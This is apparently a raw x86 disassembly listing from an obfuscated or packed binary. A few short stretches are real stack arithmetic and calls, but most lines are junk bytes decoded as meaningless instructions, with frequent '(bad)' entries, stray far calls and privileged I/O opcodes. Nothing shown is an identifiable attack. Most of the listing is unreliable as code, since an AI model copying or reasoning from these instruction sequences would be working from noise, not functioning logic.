  419e05:	mov    dx,WORD PTR [esp+0x24]
  419e0a:	xor    cx,dx
  419e0d:	mov    dx,WORD PTR [esp+0x2c]
  419e12:	imul   cx,dx
  419e16:	mov    dx,WORD PTR [esp+0x38]
  419e1b:	and    cx,dx
  419e1e:	mov    edx,0x694c
  419e23:	and    cx,dx
  419e26:	mov    dx,WORD PTR [esp+0x3c]
  419e2b:	cmp    dx,cx
  419e2e:	ja     0x41a320
  419e34:	mov    ecx,DWORD PTR [esp+0x18]
  419e38:	mov    edx,DWORD PTR [esp+0x1c]
  419e3c:	jmp    0x41a099
  419e41:	add    edi,DWORD PTR [edx-0x6d83ed16]
  419e47:	cmp    al,0xbc
  419e49:	loopne 0x419e57
  419e4b:	inc    edx
  419e4c:	fst    QWORD PTR [ebx+0x1390a097]
  419e52:	pop    ss
  419e53:	sar    BYTE PTR [esi-0x41413dcb],0xc0
  419e5a:	adc    DWORD PTR [edx+eax*8-0x3f],eax
  419e5e:	cmp    ch,BYTE PTR [ebp+0x587684d]
  419e64:	outs   dx,BYTE PTR ds:[esi]
  419e65:	call   0xffab:0x21b64c64
  419e6c:	mov    ebx,DWORD PTR [ebx]
  419e6e:	sbb    edx,DWORD PTR [edx-0x55e02e7]
  419e74:	sahf   
  419e75:	sbb    ebx,DWORD PTR [esi]
  419e77:	mov    ebp,0x72bd8d10
  419e7c:	cdq    
  419e7d:	dec    edi
  419e7e:	(bad)
  419e82:	push   0x4c
  419e84:	ja     0x419efd
  419e86:	popf   
  419e87:	push   ecx
  419e88:	xchg   ebp,eax
  419e89:	js     0x419e8d
  419e8b:	fs jge 0x419f0c
  419e8e:	(bad)  
  419e8f:	dec    bl
  419e91:	arpl   ax,si
  419e93:	fstp   QWORD PTR [esi-0x40]
  419e96:	sbb    dh,al
  419e98:	lock and DWORD PTR [eax],edx
  419e9b:	inc    edx
  419e9c:	dec    edi
  419e9d:	mov    edi,0x65112a93
  419ea2:	inc    esi
  419ea3:	or     al,0xab
  419ea5:	inc    ecx
  419ea7:	pusha  
  419ea8:	retf   
  419ea9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419eaa:	jno    0x419e45
  419eac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419ead:	jge    0x419eb3
  419eaf:	cmp    al,0x6b
  419eb1:	and    ch,BYTE PTR [ebp-0x3d]
  419eb4:	dec    ebp
  419eb5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419eb6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419eb7:	lods   eax,DWORD PTR ds:[esi]
  419eb8:	and    BYTE PTR [ebp-0x64ecf52b],cl
  419ebe:	xchg   edx,eax
  419ebf:	jnp    0x419e75
  419ec1:	dec    eax
  419ec2:	adc    BYTE PTR [ebp+0x35],0x43
  419ec6:	es scas eax,DWORD PTR es:[edi]
  419ec8:	in     al,dx
  419ec9:	dec    eax
  419eca:	pop    ss
  419ecb:	cwde   
  419ecc:	inc    edx
  419ecd:	dec    edi
  419ece:	xchg   ebx,eax
  419ecf:	adc    al,0xee
  419ed1:	cmp    DWORD PTR [edx-0x1a],eax
  419ed4:	mov    al,0xd2
  419ed6:	xchg   ecx,eax
  419ed7:	mov    ebx,0xfa3907fc
  419edc:	out    0xec,eax
  419ede:	mov    bh,0x8d
  419ee0:	jns    0x419e7b
  419ee2:	js     0x419f52
  419ee4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419ee5:	add    eax,0xa480217f
  419eea:	mov    ds:0x1128cb90,eax
  419eef:	cmp    al,0xf5
  419ef1:	sbb    ecx,esi
  419ef3:	dec    ecx
  419ef4:	pop    ebp
  419ef5:	fisttp WORD PTR [esi]
  419ef7:	xor    al,0xb8
  419ef9:	and    dl,BYTE PTR [edi]
  419efb:	scas   al,BYTE PTR es:[edi]
  419efc:	mov    fs,eax
  419efe:	lea    edi,[ebx]
  419f00:	js     0x419e92
  419f02:	stos   BYTE PTR es:[edi],al
  419f03:	jne    0x419f13
  419f05:	and    ah,dl
  419f07:	mov    edi,0xdbe9d8be
  419f0c:	imul   edx,DWORD PTR [edi+0x43fd447e],0x8fc6157d
  419f16:	inc    BYTE PTR [esi+0x1733fcbd]
  419f1c:	test   BYTE PTR [esi+0x763832b5],dh
  419f22:	sahf   
  419f23:	rcl    DWORD PTR [ebx],0xe0
  419f26:	adc    dh,BYTE PTR [eax]
  419f28:	xchg   ebx,eax
  419f29:	pop    esi
  419f2a:	inc    ebp
  419f2b:	cmp    ecx,esp
  419f2d:	cmp    BYTE PTR [edx-0x66f62057],dh
  419f33:	push   esp
  419f34:	sbb    eax,0x6f53ab3c
  419f39:	rol    DWORD PTR [edx+0x483e9b98],cl
  419f3f:	outs   dx,BYTE PTR ds:[esi]
  419f40:	push   ss
  419f41:	dec    esi
  419f42:	test   eax,0x8a346e68
  419f47:	fmul   DWORD PTR [esp+ebp*2+0x21]
  419f4b:	fcmovne st,st(3)
  419f4d:	test   DWORD PTR fs:[edi-0x3ac0e170],esp
  419f54:	(bad)  
  419f55:	popa   
  419f56:	jb     0x419f10
  419f58:	pop    ecx
  419f59:	xor    al,0x5f
  419f5b:	loop   0x419f2e
  419f5d:	dec    ecx
  419f5e:	ficom  DWORD PTR ds:0x6c571f0
  419f64:	retf   
  419f65:	jmp    0x419ee7
  419f67:	add    eax,0x619855f1
  419f6c:	icebp  
  419f6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419f6e:	scas   eax,DWORD PTR es:[edi]
  419f6f:	(bad)  
  419f70:	sbb    DWORD PTR [esi-0x9],0x29
  419f74:	mov    ds:0xd95c535b,al
  419f79:	pop    edi
  419f7a:	stos   BYTE PTR es:[edi],al
  419f7b:	sbb    BYTE PTR es:[eax],ch
  419f7e:	retf   0x1ebc
  419f81:	fisttp DWORD PTR [ebp-0x2b]
  419f84:	mov    ds:0xbbd71e5e,eax
  419f89:	stos   DWORD PTR es:[edi],eax
  419f8a:	ja     0x419fd9
  419f8c:	ficom  WORD PTR [edi+0x2324136c]
  419f92:	sbb    ecx,DWORD PTR [ebx+eax*2+0x2f]
  419f96:	leave  
  419f97:	mov    esi,DWORD PTR [edi]
  419f99:	lods   eax,DWORD PTR ds:[esi]
  419f9a:	add    DWORD PTR [edi],eax
  419f9c:	outs   dx,BYTE PTR cs:[esi]
  419f9e:	and    BYTE PTR ds:0x30f52a2b,bl
  419fa4:	mov    eax,ds:0xef8bd94e
  419fa9:	push   eax
  419faa:	ficom  WORD PTR [ebp+0x5c]
  419fad:	xchg   ecx,eax
  419fae:	mov    bh,BYTE PTR [esi+0x36]
  419fb1:	ret    
  419fb2:	sub    bl,cl
  419fb4:	repnz bnd call 0xc9ebb716
  419fbb:	inc    ecx
  419fbc:	cmp    DWORD PTR [edi+0x3d],esp
  419fbf:	aam    0xa0
  419fc1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419fc2:	pop    es
  419fc3:	mov    eax,ds:0xc7f8267d
  419fc8:	lods   al,BYTE PTR ds:[esi]
  419fc9:	jne    0x419f5a
  419fcb:	leave  
  419fcc:	push   esp
  419fcd:	jmp    0x419f63
  419fcf:	popf   
  419fd0:	ins    BYTE PTR es:[edi],dx
  419fd1:	inc    ebp
  419fd3:	mov    edi,0x936d3705
  419fd8:	fwait
  419fd9:	outs   dx,DWORD PTR ds:[esi]
  419fda:	popf   
  419fdb:	test   eax,0x729f77b2
  419fe0:	les    edx,FWORD PTR [edx+0x53]
  419fe3:	and    BYTE PTR [esp+ebx*2+0x76],bl
  419fe7:	ret    0x65c
  419fea:	add    DWORD PTR [edi+0x6],ebx
  419fed:	mul    BYTE PTR [ebx+0x2ddba098]
  419ff3:	outs   dx,DWORD PTR ds:[esi]
  419ff4:	iret   
  419ff5:	or     BYTE PTR [edx-0x42],al
  419ff8:	lock mov esp,0x361f8b57
  419ffe:	retf   0x76aa
  41a001:	push   ebx
  41a002:	sbb    cl,BYTE PTR [esi]
  41a004:	push   eax
  41a005:	outs   dx,DWORD PTR ds:[esi]
  41a006:	mov    BYTE PTR [edx+0xb],bl
  41a009:	pop    ss
  41a00a:	sahf   
  41a00b:	mov    cs,WORD PTR [ecx+ecx*4+0x71]
  41a00f:	inc    ecx
  41a010:	pop    esi
  41a011:	mul    DWORD PTR [ebx]
  41a013:	xchg   edx,eax
  41a014:	adc    DWORD PTR [edx],edx
  41a016:	jo     0x419f9d
  41a018:	sub    ch,dl
  41a01a:	add    al,0x1d
  41a01c:	rol    DWORD PTR [edi+0x56],0x3c
  41a020:	not    bh
  41a022:	mov    ds:0xe8d3f76b,eax
  41a027:	and    bl,BYTE PTR [esi]
  41a029:	push   ds
  41a02a:	and    al,0x69
  41a02c:	gs jl  0x419fba
  41a02f:	adc    dh,BYTE PTR [edi]
  41a031:	imul   edx,DWORD PTR [ecx],0x9ca2ae9b
  41a037:	pop    ds
  41a038:	mov    ch,BYTE PTR [esi-0x7f]
  41a03b:	xchg   DWORD PTR [esi+0x6e],ebp
  41a03e:	ss sti 
  41a040:	jbe    0x41a053
  41a042:	adc    DWORD PTR [edx-0x3a0f4eba],esp
  41a048:	sbb    al,0xbd
  41a04a:	mov    ah,0xe9
  41a04c:	pushf  
  41a04d:	sub    BYTE PTR [eax+esi*2],ch
  41a050:	sub    eax,0x55bc0887
  41a055:	push   eax
  41a056:	fistp  DWORD PTR [ebp+0x515e2e4c]
  41a05c:	addr16 je 0x41a0ad
  41a05f:	xchg   esi,eax
  41a060:	pop    DWORD PTR [eax]
  41a062:	push   esi
  41a063:	sub    DWORD PTR [edi-0x2c],esp
  41a066:	mov    esi,0x3150a71
  41a06b:	add    DWORD PTR [esi],esp
  41a06d:	test   BYTE PTR [edi],cl
  41a06f:	mov    ah,0xde
  41a071:	ja     0x41a0d9
  41a073:	shl    DWORD PTR [ebx+0x1],0x84
  41a077:	add    ecx,DWORD PTR cs:[eax+0x79d0bce8]
  41a07e:	inc    eax
  41a07f:	test   BYTE PTR [esi-0x7b],dl
  41a082:	and    dl,bl
  41a084:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a085:	inc    edx
  41a086:	inc    BYTE PTR [ebx]
  41a088:	in     al,dx
  41a089:	je     0x41a02d
  41a08b:	add    edx,eax
  41a08d:	dec    edi
  41a08e:	jg     0x41a091
  41a090:	pop    eax
  41a091:	pop    es
  41a092:	mov    ch,0xfc
  41a094:	cli    
  41a095:	dec    edi
  41a096:	xor    eax,0xac0f3f09
  41a09b:	rol    DWORD PTR [edx],1
  41a09d:	xor    ecx,eax
  41a09f:	mov    eax,DWORD PTR [esp+0x18]
  41a0a3:	shr    edx,0x2
  41a0a6:	mov    edx,DWORD PTR [esp+0x1c]
  41a0aa:	xor    edx,edx
  41a0ac:	jmp    0x41a309
  41a0b1:	scas   ax,WORD PTR es:[edi]
  41a0b3:	xchg   ebx,eax
  41a0b4:	mov    dh,0x9c
  41a0b6:	mov    edx,0x94c4af6c
  41a0bb:	pop    esp
  41a0bc:	rol    edi,1
  41a0be:	add    al,0x32
  41a0c0:	fisttp QWORD PTR [ebx+0x35bec01b]
  41a0c6:	ret    0xbebe
  41a0c9:	cs loopne 0x41a062
  41a0cc:	mov    esi,ss
  41a0ce:	pop    ebp
  41a0cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a0d0:	es retf 0xef62
  41a0d4:	xor    eax,0x96704a83
  41a0d9:	dec    esp
  41a0da:	ret    
  41a0db:	sbb    dh,BYTE PTR [eax+eax*4-0x2b290c1d]
  41a0e2:	jb     0x41a106
  41a0e4:	outs   dx,DWORD PTR ds:[esi]
  41a0e5:	loopne 0x41a095
  41a0e7:	pop    ebp
  41a0e8:	jp     0x41a124
  41a0ea:	dec    ecx
  41a0eb:	std    
  41a0ec:	ret    
  41a0ed:	push   ebx
  41a0ee:	jp     0x41a0f2
  41a0f0:	fidiv  WORD PTR [esi+0x12]
  41a0f3:	push   edi
  41a0f4:	xchg   BYTE PTR [eax+0x300763c4],al
  41a0fa:	push   ecx
  41a0fb:	pop    ebx
  41a0fc:	fist   DWORD PTR [eax+esi*8-0x38]
  41a100:	xchg   BYTE PTR [ebx-0x7ebf4242],ch
  41a106:	jg     0x41a151
  41a108:	push   es
  41a109:	fdivr  QWORD PTR [ebp+0x7a]
  41a10c:	or     esi,esi
  41a10e:	mov    ecx,0x9b6e429f
  41a113:	inc    ebp
  41a114:	cmp    al,0x30
  41a116:	mov    al,0xe0
  41a118:	ss mov edx,0xd20e1c69
  41a11e:	xor    eax,0x8fea25a1
  41a123:	jne    0x41a14e
  41a125:	lahf   
  41a126:	xchg   DWORD PTR [ebp+0x55],eax
  41a129:	mov    al,0x2c
  41a12b:	imul   DWORD PTR [ecx-0x1]
  41a12e:	test   DWORD PTR [ebx-0x5bbd658],eax
  41a134:	mov    BYTE PTR [eax+edi*1-0x385039e3],cl
  41a13b:	mov    esp,0x1b492ae9
  41a140:	lds    edx,FWORD PTR [esi]
  41a142:	idiv   DWORD PTR [eax+eax*4-0x35]
  41a146:	add    dh,ah
  41a148:	push   eax
  41a149:	out    dx,eax
  41a14a:	shl    BYTE PTR [ecx+0x4e2780b3],1
  41a150:	daa    
  41a151:	test   BYTE PTR [edi],al
  41a153:	gs add ah,cl
  41a156:	sub    eax,0xcdaf43eb
  41a15b:	add    DWORD PTR [esi+0x7c398bf0],0xeec8295b
  41a165:	aam    0x69
  41a167:	mov    eax,DWORD PTR [ecx+ebp*4]
  41a16a:	jne    0x41a161
  41a16c:	mov    dh,0x7c
  41a16e:	fs es dec esp
  41a171:	dec    edi
  41a172:	sbb    eax,0xfa42cd95
  41a177:	mov    dh,0xe9
  41a179:	ins    DWORD PTR es:[edi],dx
  41a17a:	add    BYTE PTR [edx+esi*8-0x24011535],al
  41a181:	inc    esi
  41a182:	xchg   ebx,eax
  41a183:	push   0x7f4dffd8
  41a188:	shl    BYTE PTR [ecx-0x21],cl
  41a18b:	adc    DWORD PTR [esi],eax
  41a18d:	fcomp  QWORD PTR [ebx-0x4aa8f58d]
  41a193:	ja     0x41a16a
  41a195:	jno    0x41a147
  41a197:	arpl   WORD PTR [eax-0x6f11ff27],bx
  41a19d:	add    DWORD PTR [eax+eiz*8-0x27],eax
  41a1a1:	ja     0x41a1e9
  41a1a3:	jg     0x41a14d
  41a1a5:	fisub  DWORD PTR [esi]
  41a1a7:	or     eax,DWORD PTR [bp+si-0x55]
  41a1ab:	pop    ecx
  41a1ac:	out    dx,al
  41a1ad:	sar    DWORD PTR [ecx],cl
  41a1af:	fnstcw WORD PTR [ecx+ecx*1+0x70]
  41a1b3:	push   edi
  41a1b4:	lock adc DWORD PTR [edx],ebx
  41a1b7:	icebp  
  41a1b8:	add    BYTE PTR [esi+eax*2+0x1e5a7908],0x3
  41a1c0:	cwde   
  41a1c1:	or     BYTE PTR [ebp-0x412b61e9],ch
  41a1c7:	loopne 0x41a170
  41a1c9:	adc    al,0xfb
  41a1cb:	xchg   ebp,eax
  41a1cc:	mov    eax,ds:0xd0bede2c
  41a1d1:	mov    ah,BYTE PTR [eax+0x14]
  41a1d4:	mov    bl,0xec
  41a1d6:	push   ebx
  41a1d7:	xchg   DWORD PTR [edi+0x67],ebp
  41a1da:	jnp    0x41a23a
  41a1dc:	or     DWORD PTR [eax-0x43],ebx
  41a1df:	mov    al,0x5d
  41a1e1:	add    al,ah
  41a1e3:	add    dh,BYTE PTR [edi]
  41a1e5:	push   0x19
  41a1e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a1e8:	or     BYTE PTR [ebp+0x43c585ad],bl
  41a1ee:	or     BYTE PTR [ecx],ch
  41a1f0:	sbb    DWORD PTR [esi+0x24],eax
  41a1f3:	add    cl,BYTE PTR [ecx+0x70]
  41a1f6:	call   0x79bd:0x5f7578e8
  41a1fd:	pop    ecx
  41a1fe:	es mov ch,0xeb
  41a201:	stos   BYTE PTR es:[edi],al
  41a202:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a203:	popa   
  41a204:	call   0x1f3cef3a
  41a209:	sbb    al,BYTE PTR [ebx+edi*8]
  41a20c:	or     ah,BYTE PTR [esi+0x73]
  41a20f:	jp     0x41a1f5
  41a211:	pop    edi
  41a212:	inc    ecx
  41a213:	neg    dh
  41a215:	pop    ebx
  41a216:	icebp  
  41a217:	push   edi
  41a218:	push   ecx
  41a219:	rol    BYTE PTR [edx+0x56],1
  41a21c:	and    BYTE PTR [esi-0x5a],dh
  41a21f:	int3   
  41a220:	call   0x2371:0x71ff945a
  41a227:	sub    edx,ebp
  41a229:	mov    eax,?
  41a22b:	sar    BYTE PTR [ebx-0x79],1
  41a22e:	daa    
  41a22f:	ror    BYTE PTR [ecx+edi*2],cl
  41a232:	inc    esp
  41a233:	mov    al,0x8e
  41a235:	das    
  41a236:	jnp    0x41a268
  41a238:	lahf   
  41a239:	pop    ds
  41a23a:	dec    ebx
  41a23b:	test   al,0x75
  41a23d:	jo     0x41a257
  41a23f:	(bad)  
  41a240:	out    0xcd,eax
  41a242:	in     al,dx
  41a243:	inc    edi
  41a244:	(bad)  
  41a245:	ins    DWORD PTR es:[edi],dx
  41a246:	in     al,dx
  41a247:	xchg   esi,eax
  41a248:	push   ebx
  41a249:	dec    esi
  41a24a:	push   eax
  41a24b:	test   BYTE PTR [ebp+0x4577e656],cl
  41a251:	data16 ss dec al
  41a255:	ins    DWORD PTR es:[edi],dx
  41a256:	inc    esp
  41a257:	int    0x12
  41a259:	inc    ebp
  41a25a:	out    dx,eax
  41a25b:	add    DWORD PTR [ebx-0xd],esi
  41a25e:	outs   dx,DWORD PTR ds:[esi]
  41a25f:	adc    DWORD PTR [ecx+0x50],esi
  41a262:	es test eax,0xa3c8952
  41a268:	push   0xeffb5715
  41a26d:	adc    BYTE PTR [edx-0x19c57031],dl
  41a273:	push   eax
  41a274:	ins    DWORD PTR es:[edi],dx
  41a275:	inc    ecx
  41a276:	mov    al,0x5a
  41a278:	mov    ch,0x5
  41a27a:	mov    ecx,ss
  41a27c:	test   DWORD PTR ds:0x46c28b90,ebx
  41a282:	pop    es
  41a283:	cwde   
  41a284:	mov    dl,0xbc
  41a286:	mov    dh,0xaf
  41a288:	inc    eax
  41a289:	xor    DWORD PTR [esp+edi*8+0xe53ce15],edx
  41a290:	mov    esi,DWORD PTR [ebx]
  41a292:	fisubr DWORD PTR [ebx+0x7c]
  41a295:	sub    eax,0x28043faf
  41a29a:	mov    esp,0x6e3d8c2d
  41a29f:	cmp    BYTE PTR [edi+edi*2+0x76a88c11],0xca
  41a2a7:	pop    ebx
  41a2a8:	adc    BYTE PTR [ebx],0x25
  41a2ab:	push   edi
  41a2ac:	test   al,0x3d
  41a2ae:	dec    ebx
  41a2af:	ret    
  41a2b0:	add    al,0xac
  41a2b2:	int3   
  41a2b3:	cmp    al,0x13
  41a2b5:	nop    DWORD PTR [ebx]
  41a2b8:	inc    eax
  41a2b9:	lods   al,BYTE PTR ds:[esi]
  41a2ba:	loope  0x41a2e2
  41a2bc:	adc    BYTE PTR [eax+0x1f569da8],dh
  41a2c2:	stc    
  41a2c3:	sbb    eax,0xf6ce2737
  41a2c8:	popf   
  41a2c9:	hlt    
  41a2ca:	xchg   edx,eax
  41a2cb:	hlt    
  41a2cc:	inc    esi
  41a2cd:	sub    DWORD PTR [ecx+0x2d],edx
  41a2d0:	es clc 
  41a2d2:	das    
  41a2d3:	mov    al,ds:0xc528c29
  41a2d8:	adc    eax,0xe2f945f2
  41a2dd:	repz fwait
  41a2df:	mov    ch,0x92
  41a2e1:	cmp    edx,esi
  41a2e3:	sub    al,0x31
  41a2e5:	mov    ch,0x3e
  41a2e7:	fadd   st(5),st
  41a2e9:	shl    DWORD PTR [esi+0x58],0x0
  41a2ed:	xchg   ebx,eax
  41a2ee:	sbb    al,0xa7
  41a2f0:	sub    cl,BYTE PTR [ebp-0x28]
  41a2f3:	shufps xmm3,xmm1,0xa3
  41a2f7:	jecxz  0x41a328
  41a2f9:	ds lock jo 0x41a366
  41a2fd:	mov    al,ds:0xf93bda40
  41a302:	push   esi
  41a303:	cmp    DWORD PTR [edx+0x0],esp
  41a306:	repnz cli 
  41a308:	cmc    
  41a309:	or     edx,ecx
  41a30b:	push   edx
  41a30c:	push   esi
  41a30d:	shl    eax,0x1e
  41a310:	push   edi
  41a311:	lea    eax,[esp+0x7c]
  41a315:	push   eax
  41a316:	lea    eax,[esp+0x28]
  41a31a:	push   eax
  41a31b:	call   0x411472
  41a320:	push   DWORD PTR [esp+0x74]
  41a324:	push   DWORD PTR [esp+0x74]
  41a328:	push   DWORD PTR [esp+0x24]
  41a32c:	push   DWORD PTR [esp+0x24]
  41a330:	call   0x412349
  41a335:	mov    edx,DWORD PTR [esp+0x18]
  41a339:	mov    eax,DWORD PTR [esp+0x1c]
  41a33d:	mov    ecx,DWORD PTR [esp+0x18]
  41a341:	mov    edi,DWORD PTR [esp+0x1c]
  41a345:	shrd   edx,eax,0x2
  41a349:	shr    eax,0x2
  41a34c:	shl    ecx,0x1e
  41a34f:	xor    ecx,ecx
  41a351:	mov    eax,0x32de6d5d
  41a356:	xor    edx,eax
  41a358:	or     ecx,edx
  41a35a:	mov    edx,DWORD PTR [esp+0x5c]
  41a35e:	mov    DWORD PTR [edx],ecx
  41a360:	mov    ecx,DWORD PTR [esp+0x18]
  41a364:	jmp    0x41a5c1
  41a369:	repz sub cl,0x71
  41a36d:	mov    edx,0x20807cbb
  41a372:	shl    al,cl
  41a374:	iret   
  41a375:	fnsave [ecx-0x46]
  41a378:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a379:	add    al,0x1f
  41a37b:	sar    BYTE PTR [esi-0x41413dcb],0x98
  41a382:	test   al,0xbc
  41a384:	xchg   ecx,eax
  41a385:	and    BYTE PTR [edx+0x42ab211e],0x40
  41a38c:	push   esi
  41a38d:	add    al,0x77
  41a38f:	stc    
  41a390:	xchg   esp,eax
  41a391:	xor    esp,eax
  41a393:	pushf  
  41a394:	push   es
  41a395:	(bad)  
  41a396:	fcomp  DWORD PTR [eax+edx*8-0x46ab6fc1]
  41a39d:	dec    ebp
  41a39e:	push   ds
  41a39f:	add    DWORD PTR [ebx+0x4b],edi
  41a3a2:	fiadd  DWORD PTR [edi+0x3a]
  41a3a5:	or     al,cl
  41a3a7:	push   es
  41a3a8:	jo     0x41a370
  41a3aa:	mul    BYTE PTR [eax+0x6]
  41a3ad:	js     0x41a3f0
  41a3af:	jl     0x41a3c4
  41a3b1:	push   esp
  41a3b2:	dec    ebp
  41a3b3:	pusha  
  41a3b4:	xor    edx,0x1e
  41a3b7:	(bad)  
  41a3b8:	adc    eax,0x7ce6526
  41a3bd:	push   esp
  41a3be:	mov    ch,0x6
  41a3c0:	xchg   esi,eax
  41a3c1:	scas   eax,DWORD PTR es:[edi]
  41a3c2:	div    edi
  41a3c4:	push   0x81a09150
  41a3c9:	mov    ch,0xfc
  41a3cb:	jl     0x41a399
  41a3cd:	scas   eax,DWORD PTR es:[edi]
  41a3ce:	lds    edi,FWORD PTR [ebx+0x5]
  41a3d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a3d2:	sub    al,0x84
  41a3d4:	pop    ebp
  41a3d5:	pop    edx
  41a3d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a3d7:	pushf  
  41a3d8:	inc    edx
  41a3d9:	dec    ebx
  41a3da:	push   0x2d391a8a
  41a3df:	pop    edi
  41a3e0:	outs   dx,BYTE PTR ds:[esi]
  41a3e1:	test   BYTE PTR [esi+0x58839df3],dl
  41a3e7:	pusha  
  41a3e8:	mov    edx,0x34f5ab23
  41a3ed:	xor    ch,bl
  41a3ef:	inc    edx
  41a3f0:	(bad)  
  41a3f1:	sbb    ebx,0x56589969
  41a3f7:	pop    ecx
  41a3f8:	mov    eax,ds:0x49d69f72
  41a3fd:	jnp    0x41a3fe
  41a3ff:	pop    edx
  41a400:	fcmove st,st(1)
  41a402:	test   DWORD PTR [ebp+0x3435440e],esp
  41a408:	ret    
  41a409:	or     eax,0x522ae729
  41a40e:	inc    eax
  41a40f:	adc    ebp,DWORD PTR [ebx-0x57]
  41a412:	ss mov cl,0x7b
  41a415:	mov    edx,0x4e5d10b0
  41a41a:	or     edx,DWORD PTR [ecx-0x6db7d0bc]
  41a420:	nop
  41a421:	fnstenv [eax-0x53a721c7]
  41a427:	or     BYTE PTR [eax-0x25],bl
  41a42a:	xchg   edx,eax
  41a42b:	sub    al,0x10
  41a42d:	mov    ebp,0xd7a2af9a
  41a432:	iret   
  41a433:	mov    al,ds:0x2468fc00
  41a438:	jne    0x41a43c
  41a43a:	enter  0x91e,0xfc
  41a43e:	jmp    0x41a41b
  41a440:	rol    DWORD PTR [ebx+0x5b],cl
  41a443:	mov    ebx,ebx
  41a445:	fsubr  DWORD PTR [esi-0x2]
  41a448:	mov    WORD PTR [edx],cs
  41a44a:	jmp    0x478b7bab
  41a44f:	nop
  41a450:	mov    al,ds:0x2bfdf07a
  41a455:	jb     0x41a3f2
  41a457:	mov    edx,0xa50c54de
  41a45c:	bnd jg 0x41a43a
  41a45f:	pop    edx
  41a461:	or     al,0xa1
  41a463:	add    BYTE PTR [esi],dh
  41a465:	adc    ebx,ebx
  41a467:	pop    edi
  41a468:	test   BYTE PTR [eax-0x2b],cl
  41a46b:	cmp    edx,DWORD PTR [esi+0x42a62528]
  41a471:	test   DWORD PTR [ebp-0x50],esp
  41a474:	bound  esi,QWORD PTR [ecx]
  41a476:	pop    ds
  41a477:	jb     0x41a4a1
  41a479:	das    
  41a47a:	in     eax,dx
  41a47b:	adc    BYTE PTR [edi],cl
  41a47d:	daa    
  41a47e:	xor    ebx,edx
  41a480:	ret    
  41a481:	xchg   esp,eax
  41a482:	arpl   WORD PTR [eax],si
  41a484:	jle    0x41a422
  41a486:	mov    ecx,0x9a87c585
  41a48b:	les    edx,FWORD PTR [edi]
  41a48d:	mov    BYTE PTR [esi],ch
  41a48f:	sub    eax,0xa8dc9db
  41a494:	lea    ebx,[ecx]
  41a496:	mov    al,ds:0x75cc0266
  41a49b:	mov    edi,DWORD PTR [ebp+0x28]
  41a49e:	into   
  41a49f:	mov    ebx,0x2058d276
  41a4a4:	inc    edx
  41a4a5:	cwde   
  41a4a6:	loopne 0x41a4b1
  41a4a8:	rol    DWORD PTR [eax+ecx*2],1
  41a4ab:	push   eax
  41a4ac:	xchg   esi,eax
  41a4ad:	xor    BYTE PTR [ebx+0x5c3f1503],dl
  41a4b3:	dec    ecx
  41a4b4:	sbb    eax,DWORD PTR [ebx+0x4d]
  41a4b7:	pushf  
  41a4b8:	inc    edx
  41a4b9:	adc    eax,0x78656af6
  41a4be:	mov    ecx,DWORD PTR [eax+0x62]
  41a4c1:	or     ebp,DWORD PTR [edi+0x67870d73]
  41a4c7:	cmp    esi,0xfffffffb
  41a4ca:	mov    ds,WORD PTR [ecx-0x2f]
  41a4cd:	mov    ebp,0xa6f6206b
  41a4d2:	scas   eax,DWORD PTR es:[edi]
  41a4d3:	pop    esi
  41a4d4:	scas   al,BYTE PTR es:[edi]
  41a4d5:	gs cdq 
  41a4d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a4d8:	pop    edx
  41a4d9:	aad    0x3f
  41a4db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a4dc:	xchg   edi,eax
  41a4dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a4de:	arpl   WORD PTR [ebp-0x147dcc82],cx
  41a4e4:	dec    esi
  41a4e5:	in     eax,0x9
  41a4e7:	pop    ds
  41a4e8:	sub    ebp,eax
  41a4ea:	push   0x7c
  41a4ec:	mov    al,ds:0xa2d10773
  41a4f1:	push   cs
  41a4f2:	fnsave [edi-0x6b]
  41a4f5:	aas    
  41a4f6:	leave  
  41a4f7:	add    DWORD PTR [esi-0x40],ecx
  41a4fa:	cmp    DWORD PTR [edi+eax*8],esi
  41a4fd:	sub    al,0x74
  41a4ff:	xchg   ebp,eax
  41a500:	imul   edx,DWORD PTR [ebx],0xffffffb7
  41a503:	cmp    DWORD PTR [ebx],esp
  41a505:	cmp    BYTE PTR [ebp-0x4f],bl
  41a508:	stos   BYTE PTR es:[edi],al
  41a509:	out    dx,eax
  41a50a:	scas   al,BYTE PTR es:[edi]
  41a50b:	aaa    
  41a50c:	cmc    
  41a50d:	mov    DWORD PTR [ecx+0x640209d5],0xff92d56f
  41a517:	mov    ebp,0x68632272
  41a51c:	xchg   DWORD PTR [ecx-0x7d79d1d4],edi
  41a522:	sub    al,0x1d
  41a524:	inc    esp
  41a525:	stos   BYTE PTR es:[edi],al
  41a526:	mov    cl,BYTE PTR [edi+0x79]
  41a529:	and    esi,edi
  41a52b:	adc    BYTE PTR [ebx-0x44],dh
  41a52e:	in     eax,dx
  41a52f:	enter  0xb3a,0x25
  41a533:	mov    ebp,0x6c661851
  41a538:	pop    eax
  41a539:	fwait
  41a53a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a53b:	xchg   BYTE PTR [ebx+0x3e],cl
  41a53e:	out    dx,eax
  41a53f:	test   BYTE PTR [ebx],0xe1
  41a542:	das    
  41a543:	ficom  WORD PTR [edi+0x69]
  41a546:	sub    al,0x3c
  41a548:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a549:	dec    ecx
  41a54a:	les    edi,FWORD PTR [esi]
  41a54c:	push   eax
  41a54d:	bound  ebp,QWORD PTR [esi-0x6c5379f7]
  41a553:	es (bad) 
  41a555:	jno    0x41a530
  41a557:	scas   eax,DWORD PTR es:[edi]
  41a558:	ss mov ecx,0x296a31a8
